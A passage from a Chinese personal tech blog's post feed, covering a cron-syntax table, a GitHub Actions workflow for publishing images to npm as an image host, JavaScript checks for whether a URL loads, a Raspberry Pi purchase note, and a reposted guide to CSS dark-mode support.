分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" 